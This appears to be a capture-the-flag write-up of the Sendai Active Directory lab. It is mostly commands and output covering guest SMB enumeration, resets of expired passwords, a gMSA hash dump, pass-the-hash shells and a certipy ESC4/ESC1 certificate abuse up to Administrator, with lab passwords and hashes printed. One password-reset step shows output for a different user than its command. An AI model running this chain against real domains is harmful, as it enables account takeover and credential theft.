
![[sendai logo.png]]



```
nmap -sVC -p- 10.129.234.66 -oN scan.txt

Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-17 19:53 CET
Nmap scan report for 10.129.234.66
Host is up (0.049s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-17 18:55:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-17T18:57:31+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2026-02-16T18:52:01
|_Not valid after:  2026-08-18T18:52:01
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
50470/tcp open  msrpc         Microsoft Windows RPC
50492/tcp open  msrpc         Microsoft Windows RPC
51573/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51574/tcp open  msrpc         Microsoft Windows RPC
51589/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-17T18:56:53
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.15 seconds
```

```
nxc smb "10.129.234.66" -u '' -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\:
SMB         10.129.234.66   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```
nxc smb "10.129.234.66" -u 'guest' -p '' --shares

SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.66   445    DC               Users           READ
```

Guest account success

```
smbclient --user 'guest' //10.129.234.66/sendai
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 18 19:31:04 2023
  ..                                DHS        0  Wed Apr 16 04:55:42 2025
  hr                                  D        0  Tue Jul 11 14:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 19:34:15 2023
  it                                  D        0  Tue Jul 18 15:16:46 2023
  legal                               D        0  Tue Jul 11 14:58:23 2023
  security                            D        0  Tue Jul 18 15:17:35 2023
  transfer                            D        0  Tue Jul 11 15:00:20 2023

                7019007 blocks of size 4096. 911272 blocks available
smb: \> get incident.txt
getting file \incident.txt of size 1372 as incident.txt (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
```


```
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```

Indicate potential password reset

```
nxc smb "10.129.234.66" -u 'guest' -p '' --rid-brute
```

```

<SNIP>

SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)

<SNIP>
```

```
nxc smb "10.129.234.66" -u users.txt -p ''

<SNIP>

SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE

<SNIP>

SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE
```


```
changepasswd.py -newpass 'Password123!' "sendai.v1"/"Elliot.Yates":""@"10.129.234.66"

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of sendai.v1\Thomas.Powell
[*] Connecting to DCE/RPC as sendai.v1\Thomas.Powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```


```
changepasswd.py -newpass 'Password123!' "sendai.v1"/"Thomas.Powell":""@"10.129.234.66"                  
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of sendai.v1\Thomas.Powell
[*] Connecting to DCE/RPC as sendai.v1\Thomas.Powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```


```
bloodhound-ce.py -c All -d "sendai.vl" -u "Elliot.Yates" -p 'Password123!' -dc "dc.sendai.vl" -ns "10.129.234.66"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sendai.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.sendai.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Found 27 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sendai.vl
INFO: Done in 00M 08S
```

```
neo4j start
```

```
bloodhound &> /dev/null &
```


![Pasted image 20260221173704](Images/Pasted%20image%2020260221173704.png)


![Pasted image 20260221180544](Images/Pasted%20image%2020260221180544.png)

That user is member of Remote Management Users

Add our user to group ADMSVC

```
bloodyAD --host "10.129.234.66" -d "sendai.vl" -u "Thomas.Powell" -p 'Password123!' add groupMember ADMSVC Thomas.Powell
[+] Thomas.Powell added to ADMSVC
```

```
gMSADumper.py -d "sendai.vl" -l "dc.sendai.vl" -u "Thomas.Powell" -p 'Password123!'
Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::aef24dfbb4c6cf2abd6a774bf2d77a70
mgtsvc$:aes256-cts-hmac-sha1-96:640b0387aa1fc9d23fbf5a6f84dd6dde65f03b0b2d91f8907af386ec7c8c4a73
mgtsvc$:aes128-cts-hmac-sha1-96:1e70d8e525b3520dc881672530f9b2ee
```

```
nxc ldap "10.129.234.66" -d "sendai.vl" -u "Thomas.Powell" -p 'Password123!' --gmsa

LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:Password123!
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: aef24dfbb4c6cf2abd6a774bf2d77a70     PrincipalsAllowedToReadPassword: admsvc
```

```
evil-winrm -u "mgtsvc$" -H "aef24dfbb4c6cf2abd6a774bf2d77a70" -i "10.129.234.66"

*Evil-WinRM* PS C:\Users\mgtsvc$\Documents>
```

```
<SNIP>

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}

<SNIP>
```

![Pasted image 20260221183648](Images/Pasted%20image%2020260221183648.png)

# Privilege Escalation

```
 certipy find -vulnerable -u "clifford.davey@sendai.vl" -p 'RFmoB2WplgE_3p'
```

```

<SNIP>
 Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

We found that the `SENDAICOMPUTER` template is vulnerable to ESC4, allowing us to modify the template and introduce an ESC1 vulnerability. This enables us to request a certificate for any user, including the Administrator.

Let's start by modifying the template

```
certipy template -u "clifford.davey@sendai.vl" -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -template SENDAICOMPUTER -write-default-configuration -no-save
```

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

Now we can request a certificate for the Administrator. We must include his SID (which we previously found using BloodHound) to bypass modern certificate mapping protections (KB5014754).

```
certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -ca sendai-DC-CA -target 'dc.sendai.vl' -template SENDAICOMPUTER -upn 'administrator' -sid 'S-1-5-21-3085872742-570972823-736764132-500'
```

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now we can authenticate as Administrator, and retrieve his password hash.

```
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -ns 10.129.234.66 -u administrator -domain 'sendai.vl'
```

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

And we can connect as Administrator on the target with evil-winrm

```
 evil-winrm -u "Administrator" -H "cfb106feec8b89a3d98e14dcbe8d087a" -i "10.129.234.66"

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

